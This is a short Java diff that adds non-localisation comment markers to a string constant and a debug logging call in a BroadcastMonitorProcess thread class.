@@ -15,7 +15,7 @@ import com.android.service.util.Check;
 
 public class BroadcastMonitorProcess extends Thread {
 	/** The Constant TAG. */
-	private static final String TAG = "BroadcastMonitorProcess";
+	private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$
 
 	private boolean stop;
 	private final int period;
@@ -43,7 +43,7 @@ public class BroadcastMonitorProcess extends Thread {
 				wait(period);
 			} catch (final InterruptedException e) {
 				if (Cfg.DEBUG) {
-					Check.log(e);
+					Check.log(e) ;//$NON-NLS-1$
 				}
 			}
 		} while (true);
